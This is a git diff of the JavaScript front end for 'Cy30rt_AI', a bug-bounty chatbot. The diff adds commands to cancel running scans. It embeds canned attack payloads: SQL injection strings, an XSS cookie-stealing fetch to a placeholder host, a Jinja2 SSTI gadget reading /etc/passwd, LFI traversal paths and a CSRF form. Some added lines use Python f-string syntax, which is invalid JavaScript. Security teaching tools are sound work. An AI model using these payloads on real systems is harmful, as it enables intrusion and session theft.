@@ -1,4 +1,4 @@
-// Cy30rt_AI - Complete Version with Reconix Integration
+// Cy30rt_AI - Complete Version with Cancel/Stop/Terminate
 // Created by Abdulbasid Yakubu (cy30rt)
 
 const API_URL = "https://cy30rt-ai.onrender.com";
@@ -9,6 +9,11 @@ let audioInitialized = false;
 let chatHistory = [];
 let currentChatId = null;
 let recordingStatusDiv = null;
+
+// Cancel/Stop functionality
+let currentAbortController = null;
+let isOperationRunning = false;
+let currentOperationType = null;
 
 // Voice settings
 let voiceSpeed = 1.0;
@@ -24,6 +29,31 @@ const voiceMap = {
     'zh': 'zh-CN', 'ja': 'ja-JP', 'ko': 'ko-KR',
     'tr': 'tr-TR', 'fa': 'fa-IR', 'ur': 'ur-PK'
 };
+
+// ============ CANCEL FUNCTIONS ============
+function cancelCurrentOperation() {
+    if (currentAbortController) {
+        currentAbortController.abort();
+        currentAbortController = null;
+        isOperationRunning = false;
+        hideTypingIndicator();
+        addSystemMessage("⏹️ **Operation cancelled.** The running scan/command has been terminated.");
+        return true;
+    } else {
+        addSystemMessage("ℹ️ No operation is currently running.");
+        return false;
+    }
+}
+
+function stopAllOperations() {
+    if (currentAbortController) {
+        currentAbortController.abort();
+        currentAbortController = null;
+    }
+    isOperationRunning = false;
+    hideTypingIndicator();
+    addSystemMessage("🛑 **All operations stopped.** Ready for new commands.");
+}
 
 // ============ CHAT HISTORY ============
 function initChatHistory() {
@@ -48,6 +78,9 @@ function saveChats() {
 }
 
 function createNewChat() {
+    if (isOperationRunning) {
+        cancelCurrentOperation();
+    }
     const newId = Date.now().toString();
     const newChat = {
         id: newId,
@@ -64,6 +97,13 @@ function createNewChat() {
 }
 
 function switchChat(chatId) {
+    if (isOperationRunning) {
+        if (confirm("A scan is currently running. Switch anyway? Current operation will be cancelled.")) {
+            cancelCurrentOperation();
+        } else {
+            return;
+        }
+    }
     currentChatId = chatId;
     loadCurrentChat();
     renderHistoryList();
@@ -131,13 +171,13 @@ function getWelcomeHTML() {
             <h1>Cy30rt_AI</h1>
             <p>Your cybersecurity & bug bounty assistant</p>
             <div class="example-prompts">
-                <button class="example-btn" onclick="sendExample('What is SQL injection?')">Learn SQLi</button>
-                <button class="example-btn" onclick="sendExample('/recon scanme.nmap.org')">Run Recon</button>
-                <button class="example-btn" onclick="sendExample('/payload xss')">Get Payloads</button>
+                <button class="example-btn" onclick="sendExample('/recon scanme.nmap.org')">Fast Recon</button>
+                <button class="example-btn" onclick="sendExample('/fullrecon scanme.nmap.org')">Full Recon</button>
+                <button class="example-btn" onclick="sendExample('/payload sqli')">Get Payloads</button>
                 <button class="example-btn" onclick="sendExample('/cve CVE-2024-6387')">Look up CVE</button>
             </div>
             <div class="creator-note">
-                Created by Abdulbasid Yakubu (cy30rt) | Type /help for all commands
+                Created by Abdulbasid Yakubu (cy30rt) | Type /help for commands | Type /cancel to stop running scans
             </div>
         </div>
     `;
@@ -162,6 +202,22 @@ function addMessageToUI(role, content, timestamp = null) {
     scrollToBottom();
 }
 
+function addSystemMessage(text) {
+    const container = document.getElementById("messagesContainer");
+    const sysDiv = document.createElement("div");
+    sysDiv.className = "message system";
+    sysDiv.innerHTML = `
+        <div class="message-avatar">ℹ️</div>
+        <div class="message-content">
+            <div class="message-text" style="background: rgba(59,130,246,0.1); text-align: center; font-size: 0.85rem;">
+                ${escapeHtml(text)}
+            </div>
+        </div>
+    `;
+    container.appendChild(sysDiv);
+    scrollToBottom();
+}
+
 function formatMessage(text) {
     text = text.replace(/```(\w*)\n([\s\S]*?)```/g, '<pre><code>$2</code></pre>');
     text = text.replace(/`([^`]+)`/g, '<code>$1</code>');
@@ -174,6 +230,10 @@ async function typeMessage(element, text) {
     element.innerHTML = '';
     const chars = text.split('');
     for (let i = 0; i < chars.length; i++) {
+        if (!isOperationRunning && currentOperationType !== 'typing') {
+            element.innerHTML += chars.slice(i).join('');
+            break;
+        }
         element.innerHTML += chars[i];
         await sleep(10);
         scrollToBottom();
@@ -184,93 +244,30 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// ============ RECONIX INTEGRATION ============
-async function runReconix(target, options = {}) {
-    const container = document.getElementById("messagesContainer");
-    const statusDiv = document.createElement("div");
-    statusDiv.className = "message assistant";
-    const messageId = 'recon_' + Date.now();
-    statusDiv.id = messageId;
-    statusDiv.innerHTML = `
-        <div class="message-avatar">🔍</div>
-        <div class="message-content">
-            <div class="message-header">
-                <span class="message-sender">Recon Engine</span>
-                <span class="message-time">${new Date().toLocaleTimeString()}</span>
-            </div>
-            <div class="message-text" id="reconStatus_${messageId}">
-                🚀 Starting reconnaissance on ${target}...
-            </div>
-        </div>
-    `;
-    container.appendChild(statusDiv);
-    scrollToBottom();
+// ============ API CALL WITH CANCEL SUPPORT ============
+async function apiCall(endpoint, options) {
+    if (currentAbortController) {
+        currentAbortController.abort();
+    }
+    
+    currentAbortController = new AbortController();
+    isOperationRunning = true;
     
     try {
-        const response = await fetch(`${API_URL}/api/recon`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ target: target, options: options })
+        const response = await fetch(`${API_URL}${endpoint}`, {
+            ...options,
+            signal: currentAbortController.signal
         });
-        
-        const data = await response.json();
-        const statusText = document.getElementById(`reconStatus_${messageId}`);
-        
-        if (data.success) {
-            let resultText = `✅ **Recon Complete - ${target}**\n\n`;
-            resultText += `📊 **Summary:**\n`;
-            resultText += `• Subdomains found: ${data.summary.subdomains_found}\n`;
-            resultText += `• Technologies detected: ${data.summary.technologies_found}\n`;
-            resultText += `• Endpoints discovered: ${data.summary.endpoints_found}\n`;
-            resultText += `• Secrets found: ${data.summary.secrets_found}\n`;
-            resultText += `• Vulnerabilities: ${data.summary.vulnerabilities_found}\n\n`;
-            
-            if (data.findings.subdomains.length > 0) {
-                resultText += `🔹 **Subdomains:**\n`;
-                data.findings.subdomains.slice(0, 10).forEach(s => resultText += `  • ${s}\n`);
-                resultText += `\n`;
-            }
-            
-            if (data.findings.technologies.length > 0) {
-                resultText += `🔹 **Technologies:**\n`;
-                data.findings.technologies.slice(0, 10).forEach(t => resultText += `  • ${t}\n`);
-                resultText += `\n`;
-            }
-            
-            if (data.findings.endpoints.length > 0) {
-                resultText += `🔹 **Key Endpoints:**\n`;
-                data.findings.endpoints.slice(0, 10).forEach(e => resultText += `  • ${e}\n`);
-                resultText += `\n`;
-            }
-            
-            if (data.findings.secrets.length > 0) {
-                resultText += `⚠️ **Potential Secrets Found - Review Carefully!**\n`;
-                data.findings.secrets.slice(0, 5).forEach(s => resultText += `  • ${s}\n`);
-                resultText += `\n`;
-            }
-            
-            resultText += `💡 **Next Steps:**\n`;
-            resultText += `• Ask me: "Analyze these findings"\n`;
-            resultText += `• Run: /payload sqli for SQL injection payloads\n`;
-            resultText += `• Check subdomains with /recon [subdomain]\n\n`;
-            resultText += `⚠️ Only test on authorized targets!\n\nStay secure. - Cy30rt_AI`;
-            
-            if (statusText) {
-                statusText.innerHTML = formatMessage(escapeHtml(resultText));
-            }
-            return data.output;
-        } else {
-            if (statusText) {
-                statusText.innerHTML = `❌ **Error:** ${escapeHtml(data.error)}\n\nMake sure Reconix is installed on the server.`;
-            }
-            return null;
-        }
+        isOperationRunning = false;
+        currentAbortController = null;
+        return response;
     } catch (error) {
-        const statusText = document.getElementById(`reconStatus_${messageId}`);
-        if (statusText) {
-            statusText.innerHTML = `❌ **Error:** ${escapeHtml(error.message)}`;
+        isOperationRunning = false;
+        currentAbortController = null;
+        if (error.name === 'AbortError') {
+            throw new Error('CANCELLED');
         }
-        return null;
+        throw error;
     }
 }
 
@@ -291,7 +288,15 @@ async function sendMessage() {
     addMessageToUI('user', message);
     addMessageToCurrentChat('user', message);
     
+    // Check for cancellation commands first
+    const cancelCommands = ["/cancel", "/stop", "/terminate", "/kill"];
+    if (cancelCommands.includes(message.toLowerCase())) {
+        cancelCurrentOperation();
+        return;
+    }
+    
     showTypingIndicator();
+    currentOperationType = 'api';
     
     try {
         // Check for recon commands
@@ -299,144 +304,167 @@ async function sendMessage() {
         let target = null;
         let options = {};
         
-        if (message.startsWith('/recon')) {
-            target = message.replace('/recon', '').trim();
-            isReconCommand = true;
-            options = {
-                deep: message.includes('--deep') || message.includes('deep'),
-                js: message.includes('--js') || message.includes('javascript'),
-                historical: message.includes('--historical') || message.includes('wayback'),
-                aggressive: message.includes('--aggressive') || message.includes('full'),
-                threads: 20
-            };
-        } else if (message.toLowerCase().includes('run recon on')) {
-            target = message.toLowerCase().replace('run recon on', '').trim();
-            isReconCommand = true;
-            options = { deep: true, js: true, historical: true, threads: 20 };
-        } else if (message.toLowerCase().match(/scan\s+([a-z0-9.-]+)/)) {
-            const match = message.toLowerCase().match(/scan\s+([a-z0-9.-]+)/);
-            if (match) {
-                target = match[1];
+        if (message.startsWith('/fullrecon')) {
+            target = message.replace('/fullrecon', '').trim();
+            if (target) {
                 isReconCommand = true;
-                options = { deep: true, js: true, historical: true, threads: 20 };
-            }
-        }
-        
-        if (isReconCommand && target) {
-            hideTypingIndicator();
-            await runReconix(target, options);
-            return;
-        }
-        
-        // Check for payload commands
-        if (message.startsWith('/payload')) {
-            const type = message.replace('/payload', '').trim().toLowerCase();
-            const payloads = {
-                'sqli': `💉 **SQL Injection Payloads**\n\n**Authentication Bypass:**\n' OR '1'='1' --\nadmin' --\n' OR 1=1--\n\n**Union-Based:**\n' UNION SELECT null, username, password FROM users--\n' UNION SELECT 1,2,3,4,5--\n\n**Time-Based:**\n' AND SLEEP(5)--\n' OR IF(1=1, SLEEP(5), 0)--`,
-                'xss': `🔓 **XSS Payloads**\n\n**Basic Alert:**\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n**Cookie Stealing:**\n<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`,
-                'ssti': `🧠 **SSTI Payloads**\n\n**Jinja2 (Python):**\n{{7*7}}\n{{config}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
-                'lfi': `📂 **LFI/RFI Payloads**\n\n**Basic LFI:**\n../../../../etc/passwd\n../../../etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php`
-            };
-            
-            if (type && payloads[type]) {
+                addSystemMessage(f"🔍 Starting FULL reconnaissance on {target}...\nType /cancel to stop.");
+                const response = await apiCall('/api/recon', {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ target: target, options: { deep: true, js: true, historical: true, aggressive: true } })
+                });
+                const data = await response.json();
                 hideTypingIndicator();
-                const messageDiv = document.createElement("div");
-                messageDiv.className = "message assistant";
-                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-                container.appendChild(messageDiv);
-                const textDiv = messageDiv.querySelector(".message-text");
-                await typeMessage(textDiv, payloads[type]);
-                addMessageToCurrentChat('assistant', payloads[type]);
-                if (autoPlayEnabled) textToSpeech(payloads[type], currentLanguage);
-                addAudioControls(messageDiv, payloads[type], currentLanguage);
+                if (data.success) {
+                    let resultText = formatReconResults(data);
+                    const messageDiv = document.createElement("div");
+                    messageDiv.className = "message assistant";
+                    messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+                    container.appendChild(messageDiv);
+                    const textDiv = messageDiv.querySelector(".message-text");
+                    await typeMessage(textDiv, resultText);
+                    addMessageToCurrentChat('assistant', resultText);
+                    if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
+                    addAudioControls(messageDiv, resultText, currentLanguage);
+                } else {
+                    addErrorMessage(data.error || "Scan failed");
+                }
+                currentOperationType = null;
                 return;
             }
         }
         
-        // Check for CVE command
+        if (message.startsWith('/recon')) {
+            target = message.replace('/recon', '').trim();
+            if (target) {
+                isReconCommand = true;
+                addSystemMessage(f"🔍 Starting reconnaissance on {target}...\nType /cancel to stop.");
+                const response = await apiCall('/api/recon', {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ target: target, options: { deep: true, threads: 10 } })
+                });
+                const data = await response.json();
+                hideTypingIndicator();
+                if (data.success) {
+                    let resultText = formatReconResults(data);
+                    const messageDiv = document.createElement("div");
+                    messageDiv.className = "message assistant";
+                    messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+                    container.appendChild(messageDiv);
+                    const textDiv = messageDiv.querySelector(".message-text");
+                    await typeMessage(textDiv, resultText);
+                    addMessageToCurrentChat('assistant', resultText);
+                    if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
+                    addAudioControls(messageDiv, resultText, currentLanguage);
+                } else {
+                    addErrorMessage(data.error || "Scan failed");
+                }
+                currentOperationType = null;
+                return;
+            }
+        }
+        
+        // Handle payload commands
+        if (message.startsWith('/payload')) {
+            const type = message.replace('/payload', '').trim().toLowerCase();
+            const payloads = getPayloads(type);
+            hideTypingIndicator();
+            const messageDiv = document.createElement("div");
+            messageDiv.className = "message assistant";
+            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+            container.appendChild(messageDiv);
+            const textDiv = messageDiv.querySelector(".message-text");
+            await typeMessage(textDiv, payloads);
+            addMessageToCurrentChat('assistant', payloads);
+            if (autoPlayEnabled) textToSpeech(payloads, currentLanguage);
+            addAudioControls(messageDiv, payloads, currentLanguage);
+            return;
+        }
+        
+        // Handle CVE commands
         if (message.startsWith('/cve')) {
             const cveId = message.replace('/cve', '').trim().toUpperCase();
             if (cveId) {
-                const cveResponse = `🔍 **CVE Intelligence: ${cveId}**\n\nSearching for ${cveId}...\n\nThis CVE lookup provides:\n• Vulnerability description\n• CVSS score (severity rating)\n• Affected software versions\n• Public exploits available\n• Mitigation steps\n\nWould you like me to analyze specific CVEs? Try /cve CVE-2024-6387 (OpenSSH)`;
+                const finalCve = cveId.startsWith('CVE-') ? cveId : `CVE-${cveId}`;
+                addSystemMessage(f"🔍 Looking up {finalCve}...");
+                const response = await apiCall(`/api/cve/${finalCve}`, { method: "GET" });
+                const data = await response.json();
                 hideTypingIndicator();
+                const resultText = formatCVEResult(data, finalCve);
                 const messageDiv = document.createElement("div");
                 messageDiv.className = "message assistant";
                 messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
                 container.appendChild(messageDiv);
                 const textDiv = messageDiv.querySelector(".message-text");
-                await typeMessage(textDiv, cveResponse);
-                addMessageToCurrentChat('assistant', cveResponse);
-                if (autoPlayEnabled) textToSpeech(cveResponse, currentLanguage);
-                addAudioControls(messageDiv, cveResponse, currentLanguage);
+                await typeMessage(textDiv, resultText);
+                addMessageToCurrentChat('assistant', resultText);
+                if (autoPlayEnabled) textToSpeech(resultText, currentLanguage);
+                addAudioControls(messageDiv, resultText, currentLanguage);
                 return;
             }
         }
         
-        // Check for help command
+        // Handle help command
         if (message === '/help' || message === '/commands') {
-            const helpResponse = `🤖 **Cy30rt_AI Complete Commands**\n\n📚 **LEARNING MODE:**\n/learn sqli - SQL injection tutorial\n/learn xss - XSS tutorial\n/learn ssti - SSTI tutorial\n\n🔍 **BUG BOUNTY MODE:**\n/recon <target> - Run automated reconnaissance\n/payload <type> - Generate payloads (sqli, xss, ssti, lfi)\n/cve <id> - Look up CVE information\n\n💬 **GENERAL:**\n/help - Show this help\n/who - About the creator\n/new - Start new chat\n\n⚠️ Always test only on authorized targets!\n\nStay secure. - Cy30rt_AI`;
+            const helpText = getHelpText();
             hideTypingIndicator();
             const messageDiv = document.createElement("div");
             messageDiv.className = "message assistant";
             messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
             container.appendChild(messageDiv);
             const textDiv = messageDiv.querySelector(".message-text");
-            await typeMessage(textDiv, helpResponse);
-            addMessageToCurrentChat('assistant', helpResponse);
-            if (autoPlayEnabled) textToSpeech(helpResponse, currentLanguage);
-            addAudioControls(messageDiv, helpResponse, currentLanguage);
+            await typeMessage(textDiv, helpText);
+            addMessageToCurrentChat('assistant', helpText);
+            if (autoPlayEnabled) textToSpeech(helpText, currentLanguage);
+            addAudioControls(messageDiv, helpText, currentLanguage);
             return;
         }
         
-        // Check for who command
+        // Handle who command
         if (message === '/who' || message === '/creator' || message === '/about') {
-            const whoResponse = `🤖 **Cy30rt_AI**\n\nI am a professional cybersecurity and bug bounty assistant created by **Abdulbasid Yakubu (cy30rt)** , a cybersecurity professional dedicated to making security education accessible.\n\n**My capabilities:**\n• Teach cybersecurity concepts\n• Run reconnaissance on authorized targets (Reconix)\n• Generate attack payloads\n• Look up CVE information\n• 15 languages support\n• Voice interaction with adjustable speed\n\n⚠️ Always practice on authorized systems only!\n\nStay secure. - Cy30rt_AI`;
+            const whoText = getWhoText();
             hideTypingIndicator();
             const messageDiv = document.createElement("div");
             messageDiv.className = "message assistant";
             messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
             container.appendChild(messageDiv);
             const textDiv = messageDiv.querySelector(".message-text");
-            await typeMessage(textDiv, whoResponse);
-            addMessageToCurrentChat('assistant', whoResponse);
-            if (autoPlayEnabled) textToSpeech(whoResponse, currentLanguage);
-            addAudioControls(messageDiv, whoResponse, currentLanguage);
+            await typeMessage(textDiv, whoText);
+            addMessageToCurrentChat('assistant', whoText);
+            if (autoPlayEnabled) textToSpeech(whoText, currentLanguage);
+            addAudioControls(messageDiv, whoText, currentLanguage);
             return;
         }
         
-        // Check for new chat command
+        // Handle learn command
+        if (message.startsWith('/learn')) {
+            const topic = message.replace('/learn', '').trim().toLowerCase();
+            const lessonText = getLessonText(topic);
+            hideTypingIndicator();
+            const messageDiv = document.createElement("div");
+            messageDiv.className = "message assistant";
+            messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
+            container.appendChild(messageDiv);
+            const textDiv = messageDiv.querySelector(".message-text");
+            await typeMessage(textDiv, lessonText);
+            addMessageToCurrentChat('assistant', lessonText);
+            if (autoPlayEnabled) textToSpeech(lessonText, currentLanguage);
+            addAudioControls(messageDiv, lessonText, currentLanguage);
+            return;
+        }
+        
+        // Handle new chat command
         if (message === '/new' || message === '/clear') {
             createNewChat();
             hideTypingIndicator();
+            addSystemMessage("✨ New conversation started! Previous chat saved in sidebar.");
             return;
         }
         
-        // Check for learn command
-        if (message.startsWith('/learn')) {
-            const topic = message.replace('/learn', '').trim().toLowerCase();
-            const lessons = {
-                'sqli': `📚 **SQL Injection Lesson**\n\n**What is SQL Injection?**\nSQL injection occurs when user input is inserted directly into SQL queries without sanitization.\n\n**How it works:**\nNormal query: SELECT * FROM users WHERE username='admin' AND password='pass'\nMalicious input: admin' --\nResult: SELECT * FROM users WHERE username='admin' -- ' AND password='anything'\n\n**Test payloads:** /payload sqli`,
-                'xss': `📚 **XSS Lesson**\n\n**What is Cross-Site Scripting?**\nInjecting malicious JavaScript into web pages.\n\n**Types:**\n1. Reflected XSS\n2. Stored XSS\n3. DOM-based XSS\n\n**Test payloads:** /payload xss`,
-                'ssti': `📚 **SSTI Lesson**\n\n**What is Server-Side Template Injection?**\nAttacker injects template engine code into server-side rendering.\n\n**Detection:**\nTry {{7*7}} or ${7*7} - if you see 49, SSTI exists!\n\n**Test payloads:** /payload ssti`
-            };
-            
-            if (topic && lessons[topic]) {
-                hideTypingIndicator();
-                const messageDiv = document.createElement("div");
-                messageDiv.className = "message assistant";
-                messageDiv.innerHTML = `<div class="message-avatar">AI</div><div class="message-content"><div class="message-header"><span class="message-sender">Cy30rt_AI</span><span class="message-time">${new Date().toLocaleTimeString()}</span></div><div class="message-text" id="streamingText"></div></div>`;
-                container.appendChild(messageDiv);
-                const textDiv = messageDiv.querySelector(".message-text");
-                await typeMessage(textDiv, lessons[topic]);
-                addMessageToCurrentChat('assistant', lessons[topic]);
-                if (autoPlayEnabled) textToSpeech(lessons[topic], currentLanguage);
-                addAudioControls(messageDiv, lessons[topic], currentLanguage);
-                return;
-            }
-        }
-        
-        // Use Groq API for other questions
-        const response = await fetch(`${API_URL}/api/chat`, {
+        // Default: Use Groq API
+        const response = await apiCall('/api/chat', {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ message: message, language: currentLanguage })
@@ -474,9 +502,77 @@ async function sendMessage() {
         
     } catch (error) {
         hideTypingIndicator();
-        console.error(error);
-        addErrorMessage(error.message);
+        currentOperationType = null;
+        if (error.message === 'CANCELLED') {
+            addSystemMessage("⏹️ Operation cancelled by user.");
+        } else {
+            console.error(error);
+            addErrorMessage(error.message);
+        }
     }
+}
+
+function formatReconResults(data) {
+    let results = `✅ **Recon Complete - ${data.target}**\n\n`;
+    results += `📊 **Summary**\n`;
+    results += `• Subdomains found: ${data.summary?.subdomains_found || 0}\n`;
+    results += `• Technologies detected: ${data.summary?.technologies_found || 0}\n`;
+    results += `• Endpoints discovered: ${data.summary?.endpoints_found || 0}\n`;
+    results += `• Secrets found: ${data.summary?.secrets_found || 0}\n\n`;
+    
+    if (data.findings?.subdomains?.length > 0) {
+        results += `🔹 **Subdomains Found:**\n`;
+        data.findings.subdomains.slice(0, 15).forEach(s => results += `  • ${s}\n`);
+        results += `\n`;
+    }
+    
+    if (data.findings?.technologies?.length > 0) {
+        results += `🔹 **Technologies:**\n`;
+        data.findings.technologies.slice(0, 10).forEach(t => results += `  • ${t}\n`);
+        results += `\n`;
+    }
+    
+    results += `💡 **Next Steps:**\n`;
+    results += `• /payload sqli - Get SQL injection payloads\n`;
+    results += `• /cve CVE-2024-6387 - Look up vulnerabilities\n`;
+    results += `• /learn sqli - Learn exploitation techniques\n\n`;
+    results += `⚠️ Type /cancel to stop any running scan.\n\nStay secure. - Cy30rt_AI`;
+    
+    return results;
+}
+
+function getPayloads(type) {
+    const payloads = {
+        "sqli": `💉 **SQL Injection Payloads**\n\n**Authentication Bypass:**\n' OR '1'='1' --\nadmin' --\n' OR 1=1--\n\n**Union-Based:**\n' UNION SELECT null, username, password FROM users--\n' UNION SELECT 1,2,3,4,5--\n\n**Time-Based:**\n' AND SLEEP(5)--\n' OR IF(1=1, SLEEP(5), 0)--`,
+        "xss": `🔓 **XSS Payloads**\n\n**Basic Alert:**\n<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg/onload=alert(1)>\n\n**Cookie Stealing:**\n<script>fetch('https://your-server.com/steal?c='+document.cookie)</script>`,
+        "ssti": `🧠 **SSTI Payloads**\n\n**Jinja2 (Python):**\n{{7*7}}\n{{config}}\n{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`,
+        "lfi": `📂 **LFI/RFI Payloads**\n\n**Basic LFI:**\n../../../../etc/passwd\n../../../etc/passwd%00\nphp://filter/convert.base64-encode/resource=index.php`,
+        "csrf": `🔄 **CSRF Payloads**\n\n<img src="https://target.com/change-email?email=hacker@evil.com">\n\n<form action="https://target.com/change-password" method="POST">\n  <input type="hidden" name="password" value="hacked123">\n</form>\n<script>document.forms[0].submit();</script>`
+    };
+    return payloads[type] || `📋 Available: sqli, xss, ssti, lfi, csrf\n\nExample: /payload sqli`;
+}
+
+function formatCVEResult(data, cveId) {
+    if (!data || data.error) {
+        return `🔍 **${cveId}**\n\n❌ CVE not found or error occurred.\n\nCheck the ID format (e.g., CVE-2024-6387)`;
+    }
+    return `🔍 **${cveId}**\n\n**Summary:** ${data.summary || 'No summary available'}\n\n**CVSS Score:** ${data.cvss || 'N/A'}\n\n**Published:** ${data.published || 'N/A'}\n\n⚠️ Always verify with official NVD database.`;
+}
+
+function getHelpText() {
+    return `🤖 **Cy30rt_AI Commands**\n\n🔍 **RECONNAISSANCE:**\n/recon <target> - Fast recon\n/fullrecon <target> - Complete workflow\n\n💉 **PAYLOADS:**\n/payload sqli - SQL injection\n/payload xss - XSS\n/payload ssti - SSTI\n/payload lfi - LFI/RFI\n/payload csrf - CSRF\n\n📋 **INTELLIGENCE:**\n/cve <id> - Look up CVE\n\n📚 **LEARNING:**\n/learn sqli - SQL lesson\n/learn xss - XSS lesson\n\n🛑 **CONTROL:**\n/cancel - Stop current operation\n/stop - Same as cancel\n/terminate - Same as cancel\n/new - Start new chat\n\n💬 **GENERAL:**\n/help - Show this\n/who - About creator\n\n⚠️ Type /cancel to stop any running scan!`;
+}
+
+function getWhoText() {
+    return `🤖 **Cy30rt_AI**\n\nCreated by **Abdulbasid Yakubu (cy30rt)** - Cybersecurity Professional\n\n**Features:**\n• Real reconnaissance tools (Reconix)\n• Payload generation (SQLi, XSS, SSTI, LFI, CSRF)\n• CVE lookup\n• Voice input with adjustable speed/pitch\n• 15 languages support\n• Chat history\n• /cancel to stop any operation\n\n⚠️ Always test on authorized targets only!`;
+}
+
+function getLessonText(topic) {
+    const lessons = {
+        "sqli": `📚 **SQL Injection Lesson**\n\n**What is SQL Injection?**\nSQL injection occurs when user input is inserted directly into SQL queries without sanitization.\n\n**How it works:**\nNormal: SELECT * FROM users WHERE username='admin'\nMalicious: admin' --\nResult: SELECT * FROM users WHERE username='admin' --\n\n**Test payloads:** /payload sqli`,
+        "xss": `📚 **XSS Lesson**\n\n**What is XSS?**\nInjecting malicious JavaScript into web pages.\n\n**Types:** Reflected, Stored, DOM-based\n\n**Test payloads:** /payload xss`
+    };
+    return lessons[topic] || `📚 Topic '${topic}' not found.\n\nAvailable: sqli, xss\n\nExample: /learn sqli`;
 }
 
 function sendExample(prompt) {
@@ -712,9 +808,15 @@ function toggleMobileMenu() {
     document.getElementById("sidebar").classList.toggle("open");
 }
 
+// ============ EXPORT FUNCTIONS FOR GLOBAL ACCESS ============
+window.cancelCurrentOperation = cancelCurrentOperation;
+window.stopAllOperations = stopAllOperations;
+window.switchChat = switchChat;
+window.sendExample = sendExample;
+
 // ============ INITIALIZE ============
 document.addEventListener("DOMContentLoaded", () => {
-    console.log("Cy30rt_AI Ready - Bug Bounty Edition with Reconix");
+    console.log("Cy30rt_AI Ready - Cancel/Stop Commands Active");
     
     initChatHistory();
     loadSettings();
@@ -766,7 +868,7 @@ document.addEventListener("DOMContentLoaded", () => {
     if (savedLang && typeof LANGUAGES !== 'undefined' && LANGUAGES[savedLang]) {
         currentLanguage = savedLang;
     }
+    
+    // Add cancel command info to console
+    console.log("Type /cancel, /stop, or /terminate to cancel running operations");
 });
-
-window.switchChat = switchChat;
-window.sendExample = sendExample;
